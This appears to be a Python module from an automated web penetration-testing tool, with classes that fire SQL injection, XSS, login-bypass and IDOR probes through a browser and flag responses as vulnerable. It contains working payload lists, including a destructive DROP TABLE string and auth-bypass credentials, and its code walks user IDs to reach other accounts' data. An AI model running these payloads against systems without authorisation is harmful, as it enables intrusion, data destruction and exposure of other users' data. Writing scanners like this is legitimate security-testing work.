from typing import Dict, Any, List
from app.agents.browser_manager import BrowserManager
import logging
import asyncio

logger = logging.getLogger(__name__)


class SQLInjectionTester:
    """Test for SQL Injection vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 1=1#",
            "'; DROP TABLE users--",
            "' WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "' AND extractvalue(1,concat(0x7e,database()))--",
        ]

    async def test_parameter(self, url: str, param_name: str, param_value: str = "") -> List[Dict[str, Any]]:
        """Test a specific parameter for SQL injection"""
        results = []

        for payload in self.payloads:
            try:
                # Construct test URL
                import urllib.parse
                if '?' in url:
                    # URL already has parameters
                    test_url = f"{url}&{param_name}={urllib.parse.quote(payload)}"
                else:
                    test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"

                # Navigate and measure response
                import time
                start_time = time.time()
                nav_result = await self.browser_manager.navigate(test_url)
                response_time = time.time() - start_time

                # Get page content
                content = await self.browser_manager.get_page_content()
                content_lower = content.lower()

                # Enhanced SQL error detection
                sql_errors = [
                    "sql syntax",
                    "mysql_fetch",
                    "ora-",
                    "postgresql",
                    "sqlite",
                    "odbc",
                    "microsoft sql",
                    "unclosed quotation",
                    "unterminated string",
                    "syntax error",
                    "sqlalchemy",
                    "database error",
                    "query failed",
                    "mysql error",
                    "pg_query",
                    "warning: mysql",
                    "valid mysql result",
                    "mysqlclient",
                    "sqlstate",
                ]

                error_found = any(error in content_lower for error in sql_errors)

                # Check for successful bypass indicators
                success_indicators = [
                    "welcome",
                    "logged in",
                    "login successful",
                    "dashboard",
                    "admin panel",
                    "user profile",
                ]
                
                bypass_success = any(indicator in content_lower for indicator in success_indicators)

                # Time-based detection
                time_based = response_time > 5 and ("SLEEP" in payload or "WAITFOR" in payload)

                # Check if we got different content than normal (boolean-based)
                boolean_based = "1=1" in payload or "1'='1" in payload

                result = {
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "status_code": nav_result.get("status"),
                    "response_time": response_time,
                    "error_detected": error_found,
                    "bypass_success": bypass_success,
                    "time_based_detected": time_based,
                    "vulnerable": error_found or bypass_success or time_based,
                    "vulnerability_type": "error-based" if error_found else ("bypass" if bypass_success else ("time-based" if time_based else "none"))
                }

                results.append(result)

                if result["vulnerable"]:
                    logger.warning(f"SQLi vulnerability found: {param_name} with payload: {payload} (type: {result['vulnerability_type']})")

            except Exception as e:
                logger.error(f"Error testing SQL injection for {param_name}: {e}")

        return results


class XSSTester:
    """Test for Cross-Site Scripting vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
        ]

    async def test_parameter(self, url: str, param_name: str) -> List[Dict[str, Any]]:
        """Test parameter for XSS"""
        results = []

        for payload in self.payloads:
            try:
                # Construct test URL
                import urllib.parse
                encoded_payload = urllib.parse.quote(payload)
                
                if '?' in url:
                    test_url = f"{url}&{param_name}={encoded_payload}"
                else:
                    test_url = f"{url}?{param_name}={encoded_payload}"

                # Navigate
                await self.browser_manager.navigate(test_url)
                await asyncio.sleep(0.2)  # Wait for page to load

                # Get page content
                content = await self.browser_manager.get_page_content()
                
                # Check for reflected payload (both encoded and decoded)
                payload_reflected = (
                    payload in content or 
                    encoded_payload in content or
                    payload.replace("'", '"') in content or
                    payload.replace('"', "'") in content
                )

                # Check for script tags or event handlers in content
                xss_indicators = [
                    "<script>",
                    "onerror=",
                    "onload=",
                    "onfocus=",
                    "onstart=",
                    "javascript:",
                    "<svg",
                    "<iframe",
                ]
                
                script_detected = any(indicator.lower() in content.lower() for indicator in xss_indicators)

                # Check if payload appears unescaped
                unescaped_payload = (
                    f">{payload}<" in content or
                    f'"{payload}"' in content or
                    f"'{payload}'" in content or
                    payload in content
                )

                result = {
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "payload_reflected": payload_reflected,
                    "script_detected": script_detected,
                    "unescaped": unescaped_payload,
                    "vulnerable": (payload_reflected and script_detected) or unescaped_payload,
                }

                results.append(result)

                if result["vulnerable"]:
                    logger.warning(f"XSS vulnerability found: {param_name} with payload: {payload}")

            except Exception as e:
                logger.error(f"Error testing XSS for {param_name}: {e}")

        return results


class CSRFTester:
    """Test for Cross-Site Request Forgery vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager

    async def test_forms(self, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test forms for CSRF protection"""
        results = []

        for form in forms:
            csrf_tokens = []
            inputs = form.get("inputs", [])

            # Check for CSRF tokens
            csrf_patterns = ["csrf", "token", "_token", "authenticity_token"]
            
            for input_field in inputs:
                input_name = input_field.get("name", "").lower()
                if any(pattern in input_name for pattern in csrf_patterns):
                    csrf_tokens.append(input_field)

            result = {
                "form_action": form.get("action"),
                "form_method": form.get("method"),
                "has_csrf_token": len(csrf_tokens) > 0,
                "csrf_tokens": csrf_tokens,
                "vulnerable": len(csrf_tokens) == 0 and form.get("method", "").upper() == "POST",
            }

            results.append(result)

            if result["vulnerable"]:
                logger.warning(f"Potential CSRF vulnerability in form: {form.get('action')}")

        return results


class AuthenticationBypassTester:
    """Test for authentication bypass vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.bypass_payloads = [
            {"username": "admin' OR '1'='1", "password": "admin' OR '1'='1"},
            {"username": "admin' --", "password": "anything"},
            {"username": "admin' #", "password": "anything"},
            {"username": "' OR '1'='1' --", "password": "' OR '1'='1' --"},
        ]

    async def test_login(self, login_url: str) -> List[Dict[str, Any]]:
        """Test login for bypass vulnerabilities"""
        results = []

        for payload in self.bypass_payloads:
            try:
                # Navigate to login page
                await self.browser_manager.navigate(login_url)

                # Attempt login with payload
                login_result = await self.browser_manager.login(
                    payload["username"], payload["password"]
                )

                # Check if login was successful (bypassed)
                current_url = self.browser_manager.page.url
                bypassed = current_url != login_url and login_result.get("success")

                result = {
                    "login_url": login_url,
                    "payload": payload,
                    "bypassed": bypassed,
                    "final_url": current_url,
                    "vulnerable": bypassed,
                }

                results.append(result)

                if result["vulnerable"]:
                    logger.warning(f"Authentication bypass detected with payload: {payload}")

            except Exception as e:
                logger.error(f"Error testing authentication bypass: {e}")

        return results


class IDORTester:
    """Test for Insecure Direct Object Reference vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager

    async def test_endpoints(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Test endpoints for IDOR"""
        results = []

        # Look for URLs with numeric IDs or id parameters
        import re
        
        # Pattern for /id/ or /123/ in URL path
        id_pattern = re.compile(r'/(\d+)/?(?:\?|$)')
        # Pattern for ?id=123 or &id=123
        param_pattern = re.compile(r'[?&]id=(\d+)')
        
        for url in urls:
            # Test path-based IDs
            match = id_pattern.search(url)
            if match:
                original_id = match.group(1)
                test_ids = [
                    str(int(original_id) + 1),
                    str(int(original_id) - 1) if int(original_id) > 1 else "999",
                    "1",
                    "2",
                    "3",
                ]

                for test_id in test_ids:
                    try:
                        test_url = url.replace(f"/{original_id}", f"/{test_id}")
                        nav_result = await self.browser_manager.navigate(test_url)
                        await asyncio.sleep(0.1)

                        # Get content to check if we can access other user's data
                        content = await self.browser_manager.get_page_content()
                        
                        # If we get a 200 response for someone else's ID, potential IDOR
                        accessible = nav_result.get("status") == 200
                        
                        # Check for user data indicators
                        data_indicators = ["email", "profile", "user", "name", "secret"]
                        contains_data = any(indicator in content.lower() for indicator in data_indicators)

                        result = {
                            "original_url": url,
                            "test_url": test_url,
                            "original_id": original_id,
                            "test_id": test_id,
                            "accessible": accessible,
                            "contains_user_data": contains_data,
                            "status_code": nav_result.get("status"),
                            "vulnerable": accessible and test_id != original_id and contains_data,
                            "test_type": "path_based"
                        }

                        results.append(result)

                        if result["vulnerable"]:
                            logger.warning(f"IDOR vulnerability found: {test_url} - can access ID {test_id}")

                    except Exception as e:
                        logger.error(f"Error testing IDOR for {url}: {e}")
            
            # Test parameter-based IDs
            param_match = param_pattern.search(url)
            if param_match:
                original_id = param_match.group(1)
                test_ids = ["1", "2", "3", str(int(original_id) + 1)]
                
                for test_id in test_ids:
                    try:
                        test_url = re.sub(r'id=\d+', f'id={test_id}', url)
                        nav_result = await self.browser_manager.navigate(test_url)
                        await asyncio.sleep(0.1)
                        
                        content = await self.browser_manager.get_page_content()
                        accessible = nav_result.get("status") == 200
                        
                        data_indicators = ["email", "profile", "user", "name", "secret"]
                        contains_data = any(indicator in content.lower() for indicator in data_indicators)
                        
                        result = {
                            "original_url": url,
                            "test_url": test_url,
                            "original_id": original_id,
                            "test_id": test_id,
                            "accessible": accessible,
                            "contains_user_data": contains_data,
                            "status_code": nav_result.get("status"),
                            "vulnerable": accessible and test_id != original_id and contains_data,
                            "test_type": "parameter_based"
                        }
                        
                        results.append(result)
                        
                        if result["vulnerable"]:
                            logger.warning(f"IDOR vulnerability found: {test_url} - can access user {test_id}'s data")
                    
                    except Exception as e:
                        logger.error(f"Error testing IDOR parameter for {url}: {e}")

        return results


class VAPTTestOrchestrator:
    """Orchestrates all vulnerability tests"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.sqli_tester = SQLInjectionTester(browser_manager)
        self.xss_tester = XSSTester(browser_manager)
        self.csrf_tester = CSRFTester(browser_manager)
        self.auth_tester = AuthenticationBypassTester(browser_manager)
        self.idor_tester = IDORTester(browser_manager)

    async def run_all_tests(self, scan_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run all VAPT tests"""
        try:
            logger.info("Starting comprehensive VAPT testing...")

            all_results = {
                "sql_injection": [],
                "xss": [],
                "csrf": [],
                "authentication_bypass": [],
                "idor": [],
            }

            urls = scan_data.get("urls", [])
            target_url = scan_data.get("target_url", "")

            # Test SQL Injection on discovered URLs and forms
            logger.info("Testing for SQL Injection...")
            
            # Test common parameter names
            common_params = ["username", "password", "email", "id", "search", "q", "query", "name", "user"]
            
            for url in urls[:10]:  # Test first 10 URLs
                for param in common_params:
                    sqli_results = await self.sqli_tester.test_parameter(url, param)
                    all_results["sql_injection"].extend(sqli_results)
                    await asyncio.sleep(0.1)  # Rate limiting
            
            # Test discovered parameters
            for param in scan_data.get("unique_parameters", [])[:10]:
                for url in urls[:5]:
                    if "?" in url or "=" in url:
                        sqli_results = await self.sqli_tester.test_parameter(url, param)
                        all_results["sql_injection"].extend(sqli_results)

            # Test XSS
            logger.info("Testing for XSS...")
            
            # Test common parameters for XSS
            xss_params = ["msg", "message", "comment", "text", "search", "q", "query", "name"]
            
            for url in urls[:10]:
                for param in xss_params:
                    xss_results = await self.xss_tester.test_parameter(url, param)
                    all_results["xss"].extend(xss_results)
                    await asyncio.sleep(0.1)

            # Test discovered parameters
            for param in scan_data.get("unique_parameters", [])[:10]:
                for url in urls[:5]:
                    xss_results = await self.xss_tester.test_parameter(url, param)
                    all_results["xss"].extend(xss_results)

            # Test CSRF
            logger.info("Testing for CSRF...")
            forms = scan_data.get("forms", [])
            if forms:
                csrf_results = await self.csrf_tester.test_forms(forms)
                all_results["csrf"] = csrf_results

            # Test Authentication Bypass
            logger.info("Testing for Authentication Bypass...")
            # Look for login endpoints
            login_urls = [
                url for url in urls 
                if any(keyword in url.lower() for keyword in ["login", "signin", "auth"])
            ]
            
            if login_urls:
                for login_url in login_urls[:3]:  # Test first 3 login URLs
                    auth_results = await self.auth_tester.test_login(login_url)
                    all_results["authentication_bypass"].extend(auth_results)
            elif target_url:
                # Try the base URL
                auth_results = await self.auth_tester.test_login(target_url)
                all_results["authentication_bypass"].extend(auth_results)

            # Test IDOR
            logger.info("Testing for IDOR...")
            # Look for URLs with IDs or profile/user endpoints
            idor_candidate_urls = [
                url for url in urls
                if any(keyword in url.lower() for keyword in ["profile", "user", "api", "id=", "/1", "/2", "/3"])
            ]
            
            if idor_candidate_urls:
                idor_results = await self.idor_tester.test_endpoints(idor_candidate_urls[:20])
                all_results["idor"] = idor_results
            else:
                # Test all URLs for potential IDOR
                idor_results = await self.idor_tester.test_endpoints(urls[:20])
                all_results["idor"] = idor_results

            # Calculate summary
            total_vulnerabilities = sum(
                len([r for r in results if r.get("vulnerable")])
                for results in all_results.values()
            )

            summary = {
                "total_tests": sum(len(results) for results in all_results.values()),
                "total_vulnerabilities": total_vulnerabilities,
                "sqli_vulnerabilities": len([r for r in all_results["sql_injection"] if r.get("vulnerable")]),
                "xss_vulnerabilities": len([r for r in all_results["xss"] if r.get("vulnerable")]),
                "csrf_vulnerabilities": len([r for r in all_results["csrf"] if r.get("vulnerable")]),
                "auth_bypass_vulnerabilities": len([r for r in all_results["authentication_bypass"] if r.get("vulnerable")]),
                "idor_vulnerabilities": len([r for r in all_results["idor"] if r.get("vulnerable")]),
            }

            logger.info(f"VAPT testing completed. Found {total_vulnerabilities} vulnerabilities")
            logger.info(f"Summary: {summary}")

            return {
                "success": True,
                "results": all_results,
                "summary": summary,
            }

        except Exception as e:
            logger.error(f"Error during VAPT testing: {e}", exc_info=True)
            return {"success": False, "error": str(e)}
